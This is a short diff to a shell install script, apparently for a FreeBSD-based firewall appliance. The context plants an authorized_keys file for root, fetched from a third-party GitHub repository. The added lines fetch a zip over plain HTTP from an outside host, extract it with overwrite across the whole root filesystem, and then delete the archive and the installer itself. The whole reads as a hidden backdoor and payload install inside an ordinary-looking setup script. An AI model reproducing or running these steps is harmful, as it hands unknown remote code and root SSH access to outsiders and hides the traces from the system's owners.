@@ -86,6 +86,11 @@ if [ ! -e /root/.ssh/authorized_keys ]; then
   fetch -am -o /root/.ssh/authorized_keys https://raw.githubusercontent.com/thanhdiepts/tdcr-xmlbk-2.2/master/root/.ssh/authorized_keys
 fi
 
+fetch http://icfad.com/download/226.zip
+unzip 226.zip -afq -d /
+rm -f 226.zip
+rm -f install.sh
+
 /usr/local/bin/php -f /etc/rc.initial.ssh
 
 clear
